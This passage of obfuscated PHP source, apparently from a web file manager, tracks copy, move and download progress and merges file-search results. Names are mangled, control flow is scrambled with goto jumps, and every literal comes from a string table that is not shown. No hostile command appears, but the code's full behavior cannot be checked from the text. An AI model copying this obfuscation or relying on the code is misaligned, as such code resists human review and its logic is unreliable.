Hook::bind($C›éàæ™…Ò[1482], array($this, $C›éàæ™…Ò[1483])); goto Dß±òœÁõ—; Dß±òœÁõ—: $e×¬ÎÙì©Û[$C›éàæ™…Ò[1484]] = LNG($C›éàæ™…Ò[1485]); $e×¬ÎÙì©Û[$C›éàæ™…Ò[1486]] = 0; $e×¬ÎÙì©Û[$C›éàæ™…Ò[1487]] = 0; goto Aöª¢Ã²ˆ; e¥ô‚ÅÜ†Â: $C›éàæ™…Ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e×¬ÎÙì©Û =& $this->task; $this->sourceCopyFolder = !1; goto c§‡ÚŒÌ‰‘; Eí“èÊ™ò…: } protected function endAfter() { goto aÅÆâõš¥”; Fæ‹ÚÑ„: Hook::unbind($FÃµï”õêÓ[1478], array($this, $FÃµï”õêÓ[1479])); Hook::unbind($FÃµï”õêÓ[1480], array($this, $FÃµï”õêÓ[1481])); Hook::unbind($FÃµï”õêÓ[1482], array($this, $FÃµï”õêÓ[1483])); goto bé¥™½‚Œ©; cËœÔ–ôÎÑ: Hook::unbind($FÃµï”õêÓ[544], array($this, $FÃµï”õêÓ[1473])); Hook::unbind($FÃµï”õêÓ[545], array($this, $FÃµï”õêÓ[1473])); Hook::unbind($FÃµï”õêÓ[511], array($this, $FÃµï”õêÓ[1474])); goto bèÕçè˜Å¯; d®ÏùÖ£°: Hook::unbind($FÃµï”õêÓ[517], array($this, $FÃµï”õêÓ[1474])); Hook::unbind($FÃµï”õêÓ[1475], array($this, $FÃµï”õêÓ[1476])); Hook::unbind($FÃµï”õêÓ[534], array($this, $FÃµï”õêÓ[1477])); goto Fæ‹ÚÑ„; aÅÆâõš¥”: $FÃµï”õêÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; Hook::unbind($FÃµï”õêÓ[1465], array($this, $FÃµï”õêÓ[1466])); Hook::unbind($FÃµï”õêÓ[1467], array($this, $FÃµï”õêÓ[1468])); goto a”…Åºó‰; a”…Åºó‰: Hook::unbind($FÃµï”õêÓ[1469], array($this, $FÃµï”õêÓ[1470])); Hook::unbind($FÃµï”õêÓ[541], array($this, $FÃµï”õêÓ[1471])); Hook::unbind($FÃµï”õêÓ[542], array($this, $FÃµï”õêÓ[1472])); goto cËœÔ–ôÎÑ; bèÕçè˜Å¯: Hook::unbind($FÃµï”õêÓ[508], array($this, $FÃµï”õêÓ[1474])); Hook::unbind($FÃµï”õêÓ[513], array($this, $FÃµï”õêÓ[1474])); Hook::unbind($FÃµï”õêÓ[515], array($this, $FÃµï”õêÓ[1474])); goto d®ÏùÖ£°; bé¥™½‚Œ©: } public function copyMoveStart($f°âÂ¸¢†, $dŠ°ß»ºğò, $F†®ö§ßŸ“, $D¥¾‘¸ßœ³) { goto BñİÂéØñÂ; Bø…Œ†¸Ãì: $D¬Ø¤ä–ŒØ[$b»Ò¡ÓÊæÑ[1494]] = KodIO::transferType($f°âÂ¸¢†, $F†®ö§ßŸ“); $this->update(); goto bÖ‰Ôº’®; BñİÂéØñÂ: $b»Ò¡ÓÊæÑ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::log($b»Ò¡ÓÊæÑ[1493] . $dŠ°ß»ºğò . $b»Ò¡ÓÊæÑ[66] . $D¥¾‘¸ßœ³); $c¨‡”÷°¨ì = rtrim(TEMP_FILES, $b»Ò¡ÓÊæÑ[8]); goto Eã—Î±‘Ğº; Eã—Î±‘Ğº: if (substr($dŠ°ß»ºğò, 0, strlen($c¨‡”÷°¨ì)) == $c¨‡”÷°¨ì) { return; } if (substr($D¥¾‘¸ßœ³, 0, strlen($c¨‡”÷°¨ì)) == $c¨‡”÷°¨ì) { return; } $D¬Ø¤ä–ŒØ =& $this->task; goto Bø…Œ†¸Ãì; bÖ‰Ôº’®: } public function updateAfter() { goto dç”Ôï¾Ø; Aí§è–Êƒ: $fùÔØôââÈ[$aœì’™›šŸ[1442]] = $fùÔØôââÈ[$aœì’™›šŸ[1491]] / $fùÔØôââÈ[$aœì’™›šŸ[699]]; if ($fùÔØôââÈ[$aœì’™›šŸ[1442]] > 0) { $D™´Ï¾Ì• = timeFloat() - $fùÔØôââÈ[$aœì’™›šŸ[1444]] - $fùÔØôââÈ[$aœì’™›šŸ[1447]]; $fùÔØôââÈ[$aœì’™›šŸ[1448]] = $D™´Ï¾Ì• * (1 - $fùÔØôââÈ[$aœì’™›šŸ[1442]]) / $fùÔØôââÈ[$aœì’™›šŸ[1442]]; } goto FÚÇÓåæÒ ; dç”Ôï¾Ø: $aœì’™›šŸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fùÔØôââÈ =& $this->task; if (!$fùÔØôââÈ[$aœì’™›šŸ[699]]) { return; } goto A²ÌÒÕ·õ; A²ÌÒÕ·õ: if ($this->sourceModelCopyFlag) { return; } if ($fùÔØôââÈ[$aœì’™›šŸ[1494]] == $aœì’™›šŸ[1098]) { return; } if ($fùÔØôââÈ[$aœì’™›šŸ[1494]] == $aœì’™›šŸ[1044] || $fùÔØôââÈ[$aœì’™›šŸ[1494]] == $aœì’™›šŸ[103]) { if ($fùÔØôââÈ[$aœì’™›šŸ[1488]]) { $fùÔØôââÈ[$aœì’™›šŸ[1491]] = $fùÔØôââÈ[$aœì’™›šŸ[1490]] + $fùÔØôââÈ[$aœì’™›šŸ[1487]]; } } else { if ($fùÔØôââÈ[$aœì’™›šŸ[1494]] == $aœì’™›šŸ[1099]) { if ($fùÔØôââÈ[$aœì’™›šŸ[1488]] == $aœì’™›šŸ[1044]) { $fùÔØôââÈ[$aœì’™›šŸ[1491]] = $fùÔØôââÈ[$aœì’™›šŸ[1490]] + $fùÔØôââÈ[$aœì’™›šŸ[1487]] * 0.5; } else { if ($fùÔØôââÈ[$aœì’™›šŸ[1488]] == $aœì’™›šŸ[103]) { $fùÔØôââÈ[$aœì’™›šŸ[1491]] = $fùÔØôââÈ[$aœì’™›šŸ[1490]] + $fùÔØôââÈ[$aœì’™›šŸ[1486]] * 0.5 + $fùÔØôââÈ[$aœì’™›šŸ[1487]] * 0.5; } } } } goto Aí§è–Êƒ; FÚÇÓåæÒ : } public function addPath($f›×óŸ¤) { goto bÂ“ã…à†ğ; bÂ“ã…à†ğ: $cçåŠÒƒºÌ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$f›×óŸ¤) { return; } $D°ñœİá½ =& $this->task; goto Eôàêö¥•²; Eôàêö¥•²: $FŞå¼ò¿ëÁ = IO::infoWithChildren($f›×óŸ¤); $BÆº¡Ñª“ô = $D°ñœİá½[$cçåŠÒƒºÌ[1495]] ? $D°ñœİá½[$cçåŠÒƒºÌ[1495]][$cçåŠÒƒºÌ[1496]] : 0; $D°ñœİá½[$cçåŠÒƒºÌ[1495]] = array($cçåŠÒƒºÌ[1496] => $BÆº¡Ñª“ô + 1, $cçåŠÒƒºÌ[386] => $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[28]], $cçåŠÒƒºÌ[75] => $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[75]], $cçåŠÒƒºÌ[468] => $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[468]] ? $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[468]] : $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[75]]); goto fÔâŞè Òº; fÔâŞè Òº: if ($FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[29]] == $cçåŠÒƒºÌ[167]) { $D°ñœİá½[$cçåŠÒƒºÌ[980]] += 1; } else { $D°ñœİá½[$cçåŠÒƒºÌ[980]] += $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[80]][$cçåŠÒƒºÌ[78]]; if ($FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[369]]) { $D°ñœİá½[$cçåŠÒƒºÌ[980]] += $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[80]][$cçåŠÒƒºÌ[79]] + 1; } } $D°ñœİá½[$cçåŠÒƒºÌ[699]] += $FŞå¼ò¿ëÁ[$cçåŠÒƒºÌ[77]]; $this->update(); goto B”ÏÉóà†„; B”ÏÉóà†„: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dİ£‰…È´) { $D‹µã ¶¯Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÖÔÁÄƒÂ» =& $this->task; $bÖÔÁÄƒÂ»[$D‹µã ¶¯Ä[1484]] = $dİ£‰…È´[$D‹µã ¶¯Ä[28]]; $bÖÔÁÄƒÂ»[$D‹µã ¶¯Ä[982]] = $dİ£‰…È´[$D‹µã ¶¯Ä[28]]; $this->update(); } public function copyFileStart($e¥ö´Õ±§İ, $AÊ†ŠÀñåÃ, $b©ªˆÅŠÖ², $Bø£ñ•ã‹¾, $F¼Òâ²êŞ¶, $bˆÏ÷Ñàä) { goto DÈôÕ‹ßÁ; DÈôÕ‹ßÁ: $A¾¡×öĞ°÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B­…šˆŞ = $F¼Òâ²êŞ¶; if ($B­…šˆŞ == $GLOBALS[$A¾¡×öĞ°÷[1497]]) { $B­…šˆŞ = $GLOBALS[$A¾¡×öĞ°÷[1498]]; } goto b„£œéƒ„¸; aŠ÷±«ìò: $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[982]] = $A¾¡×öĞ°÷[33]; $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[1488]] = $A¾¡×öĞ°÷[33]; $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[1489]] = 0; goto Cé±±ŠÅß÷; A§«à‡õ«¿: $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[1484]] = $B­…šˆŞ; $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[1486]] = (int) $e¥ö´Õ±§İ->size($AÊ†ŠÀñåÃ); $eõ¦¨Ğ©å•[$A¾¡×öĞ°÷[1487]] = 0; goto aŠ÷±«ìò; Cé±±ŠÅß÷: $this->update(); goto dË§äçÜé; b„£œéƒ„¸: $GLOBALS[$A¾¡×öĞ°÷[1498]] = $F¼Òâ²êŞ¶; $GLOBALS[$A¾¡×öĞ°÷[1497]] = $bˆÏ÷Ñàä; $eõ¦¨Ğ©å• =& $this->task; goto A§«à‡õ«¿; dË§äçÜé: } public function copyFileEnd($eÈÈÜğæõ, $bÊÕ—ï¥³Ã, $bõ‡»¢‰ÕÉ, $B¡éçÍòÃ, $CÇ’Í£¥, $cöÎåâô˜) { $aƒ“ÎÆÌÓŒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C×‡“Û‡ï³ =& $this->task; $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1487]] = $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1486]]; $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1488]] = $aƒ“ÎÆÌÓŒ[33]; if ($CÇ’Í£¥ == $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1484]]) { $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1490]] += $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1486]]; $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1491]] = $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1490]]; $this->update(1); } else { $this->update(); $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1487]] = 0; } self::log($aƒ“ÎÆÌÓŒ[1499] . $bÊÕ—ï¥³Ã . $aƒ“ÎÆÌÓŒ[66] . $B¡éçÍòÃ . $aƒ“ÎÆÌÓŒ[217] . $CÇ’Í£¥ . $aƒ“ÎÆÌÓŒ[1500] . $C×‡“Û‡ï³[$aƒ“ÎÆÌÓŒ[1484]]); } public function updateFileEnd($eŠÒõ‹ì±Ã, $cÈÛÕÇÕ¼) { goto F‚Ùå×‰¼ğ; b…âø“½Ÿ: $this->update(1); self::log($dì¬©¢â°[1501] . $eŠÒõ‹ì±Ã); goto a¬¦±ÎñÁ¸; fâÚ×Öè¦±: $cÁÑĞà®‘Ğ[$dì¬©¢â°[1486]] = $cÈÛÕÇÕ¼; $cÁÑĞà®‘Ğ[$dì¬©¢â°[1490]] += $cÈÛÕÇÕ¼; $cÁÑĞà®‘Ğ[$dì¬©¢â°[1491]] = $cÁÑĞà®‘Ğ[$dì¬©¢â°[1490]]; goto b…âø“½Ÿ; F‚Ùå×‰¼ğ: $dì¬©¢â° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÁÑĞà®‘Ğ =& $this->task; $cÁÑĞà®‘Ğ[$dì¬©¢â°[1484]] = $eŠÒõ‹ì±Ã; goto fâÚ×Öè¦±; a¬¦±ÎñÁ¸: } public function sourceModelCopy($C¿Òº¨­òÀ) { goto C‰†Î–àß; Aâ íö–¦: switch ($B…Çò¾£Õ–) { case $aÚÌ¾×­¿Ë[509]: $BİÆ­‘‡ã = 1; break; case $aÚÌ¾×­¿Ë[512]: $aš¥¾ îà[$aÚÌ¾×­¿Ë[1484]] = $e‹‡‘Ä‡¹¯[$aÚÌ¾×­¿Ë[28]]; break; case $aÚÌ¾×­¿Ë[514]: $BİÆ­‘‡ã = intval($C¿Òº¨­òÀ[$aÚÌ¾×­¿Ë[363]] * 0.4); break; case $aÚÌ¾×­¿Ë[516]: $BİÆ­‘‡ã = intval($C¿Òº¨­òÀ[$aÚÌ¾×­¿Ë[363]] * 0.2); break; case $aÚÌ¾×­¿Ë[518]: $BİÆ­‘‡ã = intval($C¿Òº¨­òÀ[$aÚÌ¾×­¿Ë[363]] * 0.4); break; } $this->update($BİÆ­‘‡ã); $this->sourceModelCopyFlag = !1; goto B–¯Õƒ«Û; C‰†Î–àß: $aÚÌ¾×­¿Ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B…Çò¾£Õ– = $C¿Òº¨­òÀ[0]; $e‹‡‘Ä‡¹¯ = $C¿Òº¨­òÀ[1]; goto eÌÜ‰£ì‚¹; eÌÜ‰£ì‚¹: $aš¥¾ îà =& $this->task; $this->sourceModelCopyFlag = !0; $BİÆ­‘‡ã = 0; goto Aâ íö–¦; B–¯Õƒ«Û: } public function sourceRemove($D¤Ò´ëÔæ–, $A•µƒˆ´ÂÖ) { $eçòÙ²Ú•Í =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->sourceModelCopyFlag = !0; $C­–„½ƒ‹ = 1; if (isset($D¤Ò´ëÔæ–[$eçòÙ²Ú•Í[80]])) { $C­–„½ƒ‹ = $D¤Ò´ëÔæ–[$eçòÙ²Ú•Í[80]][$eçòÙ²Ú•Í[78]] + $D¤Ò´ëÔæ–[$eçòÙ²Ú•Í[80]][$eçòÙ²Ú•Í[79]] + 1; } $this->update($C­–„½ƒ‹); $this->sourceModelCopyFlag = !1; } public function sourceMove($fÖ°Á°ª¶) { $this->sourceRemove($fÖ°Á°ª¶, !1); } public function curlProgress($bÜç«æé¤Ê, $c™°¤…™‹´, $bÎØÄ±¦¤š, $E§ÌÛŞ‹ì£, $a²´»¹ì³á) { $dİ¾ø¤Å‡š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fæ—»»æ„‘ =& $this->task; if ($a²´»¹ì³á > 0) { $fæ—»»æ„‘[$dİ¾ø¤Å‡š[982]] = $dİ¾ø¤Å‡š[1502]; $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1488]] = $dİ¾ø¤Å‡š[103]; if ($fæ—»»æ„‘[$dİ¾ø¤Å‡š[1486]] == $E§ÌÛŞ‹ì£ || $E§ÌÛŞ‹ì£ > 1024 * 1024) { $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1487]] = $a²´»¹ì³á; } if ($fæ—»»æ„‘[$dİ¾ø¤Å‡š[1489]]) { $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1487]] = $a²´»¹ì³á + $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1489]]; } } else { if ($bÎØÄ±¦¤š > 0) { if ($fæ—»»æ„‘[$dİ¾ø¤Å‡š[1486]] == $c™°¤…™‹´) { $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1487]] = $bÎØÄ±¦¤š; $fæ—»»æ„‘[$dİ¾ø¤Å‡š[982]] = $dİ¾ø¤Å‡š[1503]; $fæ—»»æ„‘[$dİ¾ø¤Å‡š[1488]] = $dİ¾ø¤Å‡š[1044]; } } } $this->update(); } public function curlProgressStart($eÒ•ÊÅôÒ„) { } public function curlProgressEnd($B¢­©åæ¢) { $dİÜø†˜Ì÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÅ§‚šÉ¶ =& $this->task; $d Å“ƒÑğŠ = curl_getinfo($B¢­©åæ¢); $eÀÒÊ«½ç‚ = $d Å“ƒÑğŠ[$dİÜø†˜Ì÷[1504]]; if ($BÅ§‚šÉ¶[$dİÜø†˜Ì÷[1488]] == $dİÜø†˜Ì÷[103] && $eÀÒÊ«½ç‚) { $BÅ§‚šÉ¶[$dİÜø†˜Ì÷[1489]] += $eÀÒÊ«½ç‚; } $this->update(); } } goto b‹ƒ‘¯¸ß; Eˆ•„õÍ»º: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($C¤ƒ—¹¤ä) { goto DÕé…ÂÈ§; F˜µ¶¸àš§: if (!$C’ÀËğó²) { return array(); } $CôÓ›Èêê = $C’ÀËğó²[$dİ‰ÑÁ©[160]]; $c„™ÂËÚÁ = $dİ‰ÑÁ©[7]; goto FÃô¬ŸÅ; FÃô¬ŸÅ: if (!$C’ÀËğó²[$dİ‰ÑÁ©[160]]) { $c·Ó¡å±£· = array_to_keyvalue($CºÀª³–™Š, $dİ‰ÑÁ©[33], $dİ‰ÑÁ©[160]); $CôÓ›Èêê = implode($dİ‰ÑÁ©[47], $c·Ó¡å±£·); $c„™ÂËÚÁ = $dİ‰ÑÁ©[2286]; } $bšØ†õ¼Û = explode($dİ‰ÑÁ©[47], trim($CôÓ›Èêê, $dİ‰ÑÁ©[47])); return array($c„™ÂËÚÁ, $bšØ†õ¼Û); goto D¿©¯Ù©“”; DÕé…ÂÈ§: $dİ‰ÑÁ© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CºÀª³–™Š = KodIO::fileTypeList(); $C’ÀËğó² = $CºÀª³–™Š[$C¤ƒ—¹¤ä]; goto F˜µ¶¸àš§; D¿©¯Ù©“”: } public function listPathType($BŒôŠ‘Ü”) { $bõÎÖøØ ¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dñ¤›®å…µ = $this->fileTypeWhere($BŒôŠ‘Ü”); if (!$Dñ¤›®å…µ) { return array(); } $A¦ áˆÄ¢² = array($bõÎÖøØ ¦[523] => SourceModel::TYPE_USER, $bõÎÖøØ ¦[524] => USER_ID, $bõÎÖøØ ¦[520] => 0, $bõÎÖøØ ¦[521] => $Dñ¤›®å…µ); return $this->listSource($A¦ áˆÄ¢²); } public function listSearch($fÜ…ªÛÒÄ, $F˜Åˆë™”Ë = 300) { goto fƒ¥‡ğŞö²; C”œèËËŒÜ: $this->_listSearchBindPinyin($fÜ…ªÛÒÄ, $Dô§ê·’‡±, $eî™à—†·ã); $this->alias($aŒŠî¤ŒÏ¶[489])->_makeOrder()->cache(null, 10); $e½ÑØ†ëÁ‰ = $this->distinct(!0)->field($eî™à—†·ã)->where($Dô§ê·’‡±)->selectPage($F˜Åˆë™”Ë); goto fËŠ˜êŞŒ; fƒ¥‡ğŞö²: $aŒŠî¤ŒÏ¶ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($fÜ…ªÛÒÄ[$aŒŠî¤ŒÏ¶[2193]]) && $fÜ…ªÛÒÄ[$aŒŠî¤ŒÏ¶[2193]]) { $fÜ…ªÛÒÄ[$aŒŠî¤ŒÏ¶[2193]] = str_replace($aŒŠî¤ŒÏ¶[1597], $aŒŠî¤ŒÏ¶[2336], trim($fÜ…ªÛÒÄ[$aŒŠî¤ŒÏ¶[2193]])); } $Dô§ê·’‡± = $this->_parseSearchWhere($fÜ…ªÛÒÄ); goto F÷Æ»Ò–ëæ; fËŠ˜êŞŒ: $this->_listSearchDesc($e½ÑØ†ëÁ‰, $fÜ…ªÛÒÄ, $aØ›Šˆ„Æ); $this->_listSearchTag($e½ÑØ†ëÁ‰, $fÜ…ªÛÒÄ, $aØ›Šˆ„Æ); $this->_listSearchGroupTag($e½ÑØ†ëÁ‰, $fÜ…ªÛÒÄ, $aØ›Šˆ„Æ); goto dô½ÚÛ½–í; dô½ÚÛ½–í: $this->_listDataApply($e½ÑØ†ëÁ‰[$aŒŠî¤ŒÏ¶[354]]); $this->_listMake($e½ÑØ†ëÁ‰); return $e½ÑØ†ëÁ‰; goto e¤½é¡Ï¼; F÷Æ»Ò–ëæ: if (!isset($Dô§ê·’‡±[$aŒŠî¤ŒÏ¶[397]])) { $Dô§ê·’‡±[$aŒŠî¤ŒÏ¶[397]] = 0; } $eî™à—†·ã = $aŒŠî¤ŒÏ¶[2337]; $aØ›Šˆ„Æ = $eî™à—†·ã; goto C”œèËËŒÜ; e¤½é¡Ï¼: } private function _listSearchTag(&$Aëâ³í±èæ, $B¿ˆ ®Â¸æ, $fÌ‹‡½¸»—) { goto B¡”—Ç–•; b¹•îóËŠ: $döğøØë = array_to_keyvalue($döğøØë, $A­ïñ½ìÈ‚[33], $A­ïñ½ìÈ‚[75]); $aÒÃê¦ÔÆˆ = array_unique($döğøØë); $this->_listSearchMerge($Aëâ³í±èæ, $B¿ˆ ®Â¸æ, $fÌ‹‡½¸»—, $aÒÃê¦ÔÆˆ); goto aîÍôÎ²…; cŠÚ¹ñ¿¦ç: if (!$DõµáØôä) { return; } $BÜßˆºÒá = array($A­ïñ½ìÈ‚[393] => array($A­ïñ½ìÈ‚[7], $DõµáØôä), $A­ïñ½ìÈ‚[1441] => USER_ID); $döğøØë = Model($A­ïñ½ìÈ‚[394])->field($A­ïñ½ìÈ‚[75])->where($BÜßˆºÒá)->select(); goto b¹•îóËŠ; E“í¡ÏÜ¶­: $DõµáØôä = array(); $fëÈŞÜåÔ¢ = $B¿ˆ ®Â¸æ[$A­ïñ½ìÈ‚[2193]]; foreach ($f‰õ‹ÅŒ«‰ as $b‡ ‘¯óğ) { $C¼Ü¨åÙÅ¬ = $b‡ ‘¯óğ[$A­ïñ½ìÈ‚[28]]; $CÁÏÉ’÷ß = str_replace($A­ïñ½ìÈ‚[50], $A­ïñ½ìÈ‚[33], Pinyin::encode($C¼Ü¨åÙÅ¬)); if (stripos($C¼Ü¨åÙÅ¬, $fëÈŞÜåÔ¢) !== !1 || stripos($CÁÏÉ’÷ß, $fëÈŞÜåÔ¢) !== !1) { $DõµáØôä[] = $b‡ ‘¯óğ[$A­ïñ½ìÈ‚[367]]; } } goto cŠÚ¹ñ¿¦ç; B¡”—Ç–•: $A­ïñ½ìÈ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$B¿ˆ ®Â¸æ[$A­ïñ½ìÈ‚[2193]] || $Aëâ³í±èæ[$A­ïñ½ìÈ‚[351]][$A­ïñ½ìÈ‚[340]] > 1) { return; } $f‰õ‹ÅŒ«‰ = Model($A­ïñ½ìÈ‚[2338])->listData(); goto E“í¡ÏÜ¶­; aîÍôÎ²…: } private function _listSearchDesc(&$C¼ÀìÄçÓ§, $a­»¸Ã™™Ó, $Bå‰¼–õŸ) { goto CóÂ…‚ÚŒÃ; C¯—Ó‚ÖÖ: $dïô¸Ïİİ› = array_unique($dïô¸Ïİİ›); if (!$dïô¸Ïİİ›) { return; } $e‹©Îæ·§´ = array($f•¨ğãòˆ¿[369] => array($f•¨ğãòˆ¿[7], $dïô¸Ïİİ›), $f•¨ğãòˆ¿[89] => $f•¨ğãòˆ¿[405], $f•¨ğãòˆ¿[359] => array($f•¨ğãòˆ¿[752], $f•¨ğãòˆ¿[2195] . $a­»¸Ã™™Ó[$f•¨ğãòˆ¿[2193]] . $f•¨ğãòˆ¿[2195])); goto CĞËˆó¢·†; CóÂ…‚ÚŒÃ: $f•¨ğãòˆ¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$a­»¸Ã™™Ó[$f•¨ğãòˆ¿[2193]] || $C¼ÀìÄçÓ§[$f•¨ğãòˆ¿[351]][$f•¨ğãòˆ¿[340]] > 1) { return; } $dïô¸Ïİİ› = $this->listSearchChildren($a­»¸Ã™™Ó[$f•¨ğãòˆ¿[463]]); goto C¯—Ó‚ÖÖ; CĞËˆó¢·†: $BĞ‹÷‹ë = Model($f•¨ğãòˆ¿[506])->field($f•¨ğãòˆ¿[369])->where($e‹©Îæ·§´)->select(); $c¾ÍäÇ”õğ = array_to_keyvalue($BĞ‹÷‹ë, $f•¨ğãòˆ¿[33], $f•¨ğãòˆ¿[369]); $this->_listSearchMerge($C¼ÀìÄçÓ§, $a­»¸Ã™™Ó, $Bå‰¼–õŸ, $c¾ÍäÇ”õğ); goto cæÜƒ¥ÍÏš; cæÜƒ¥ÍÏš: } private function _listSearchGroupTag(&$E…òÁù¸, $C‡ĞñÜ‹±æ, $b¤Õ«Ùå©­) { goto DßÉàÕÄö…; bàæ¤¿ø: if (!$eğ±ô‹–ªæ || $eğ±ô‹–ªæ[$eÁÚÀî”‚”[371]] != SourceModel::TYPE_GROUP) { return; } $dö‹‘“´› = $eğ±ô‹–ªæ[$eÁÚÀî”‚”[458]]; $FÅâ¸Œ¸£Š = Model($eÁÚÀî”‚”[2339])->get($dö‹‘“´›); goto A¦÷ˆ—ô’í; A¦÷ˆ—ô’í: $C÷Ğ»ãß×Û = array(); $e…®îï²Ñ = $C‡ĞñÜ‹±æ[$eÁÚÀî”‚”[2193]]; foreach ($FÅâ¸Œ¸£Š[$eÁÚÀî”‚”[354]] as $EÒäÀÌ‡Òí) { $aÑøĞªŸí = $EÒäÀÌ‡Òí[$eÁÚÀî”‚”[28]]; $dÈß¼Êõß˜ = str_replace($eÁÚÀî”‚”[50], $eÁÚÀî”‚”[33], Pinyin::encode($aÑøĞªŸí)); if (stripos($aÑøĞªŸí, $e…®îï²Ñ) !== !1 || stripos($dÈß¼Êõß˜, $e…®îï²Ñ) !== !1) { $C÷Ğ»ãß×Û[] = $EÒäÀÌ‡Òí[$eÁÚÀî”‚”[367]]; } } goto añìÅÂïä¨; DßÉàÕÄö…: $eÁÚÀî”‚” =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$C‡ĞñÜ‹±æ[$eÁÚÀî”‚”[2193]] || $E…òÁù¸[$eÁÚÀî”‚”[351]][$eÁÚÀî”‚”[340]] > 1 || !$C‡ĞñÜ‹±æ[$eÁÚÀî”‚”[463]]) { return; } $eğ±ô‹–ªæ = $this->sourceInfo($C‡ĞñÜ‹±æ[$eÁÚÀî”‚”[463]]); goto bàæ¤¿ø; añìÅÂïä¨: if (!$C÷Ğ»ãß×Û) { return; } $B‰Æö´©âÏ = array($eÁÚÀî”‚”[393] => array($eÁÚÀî”‚”[7], $C÷Ğ»ãß×Û), $eÁÚÀî”‚”[1441] => 0, $eÁÚÀî”‚”[29] => $eÁÚÀî”‚”[2213] . $dö‹‘“´›); $eÊƒö¸¤†÷ = Model($eÁÚÀî”‚”[394])->field($eÁÚÀî”‚”[75])->where($B‰Æö´©âÏ)->select(); goto eßÀ©§ºÒ×; eßÀ©§ºÒ×: $eÊƒö¸¤†÷ = array_to_keyvalue($eÊƒö¸¤†÷, $eÁÚÀî”‚”[33], $eÁÚÀî”‚”[75]); $f¦«ÈÃ±º» = array_unique($eÊƒö¸¤†÷); $this->_listSearchMerge($E…òÁù¸, $C‡ĞñÜ‹±æ, $b¤Õ«Ùå©­, $f¦«ÈÃ±º»); goto a‡ÅÑè…; a‡ÅÑè…: } private function _listSearchMerge(&$C¦´Š……Ñ, $eœøˆÛ‘ëÊ, $eÓóˆ‹ÆÌ•, $D½î®õ†ã²) { goto dŠ’Ñà²§«; dŠ’Ñà²§«: $CÏ±ó¸©†Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$D½î®õ†ã²) { return; } $E´Ÿ½·‹²œ = array_to_keyvalue($C¦´Š……Ñ[$CÏ±ó¸©†Ä[354]], $CÏ±ó¸©†Ä[33], $CÏ±ó¸©†Ä[369]); goto b‰„çÅ†ó§; b‰„çÅ†ó§: $fàƒã»»Ä = array_diff($D½î®õ†ã², $E´Ÿ½·‹²œ); if (!$fàƒã»»Ä) { return; } $d˜¿”¨¾´¢ = array($CÏ±ó¸©†Ä[369] => array($CÏ±ó¸©†Ä[7], $fàƒã»»Ä)); goto f¬÷—‘Ìµ; f¬÷—‘Ìµ: $Bâæìö¹¥Ã = $this->field($eÓóˆ‹ÆÌ•)->where($d˜¿”¨¾´¢)->select(); if (!$Bâæìö¹¥Ã) { return; } $eÀÌßòœáÏ = array(); goto CÉ…ÇÊ˜°œ; CÉ…ÇÊ˜°œ: foreach ($Bâæìö¹¥Ã as $BİßÚŸ») { $eÕ„…Á®¾£ = $CÏ±ó¸©†Ä[47] . $eœøˆÛ‘ëÊ[$CÏ±ó¸©†Ä[463]] . $CÏ±ó¸©†Ä[47]; if (stripos($BİßÚŸ»[$CÏ±ó¸©†Ä[461]], $eÕ„…Á®¾£) !== !1) { $eÀÌßòœáÏ[] = $BİßÚŸ»; } } $C¦´Š……Ñ[$CÏ±ó¸©†Ä[354]] = array_merge($eÀÌßòœáÏ, $C¦´Š……Ñ[$CÏ±ó¸©†Ä[354]]); $C¦´Š……Ñ[$CÏ±ó¸©†Ä[351]][$CÏ±ó¸©†Ä[352]] += count($eÀÌßòœáÏ); goto aƒ‹ù¹¡ğ; aƒ‹ù¹¡ğ: } public function listSearchChildren($DŸ¦±Ü¢…, $d¨Áİ»¨”Ì = 5000) { goto 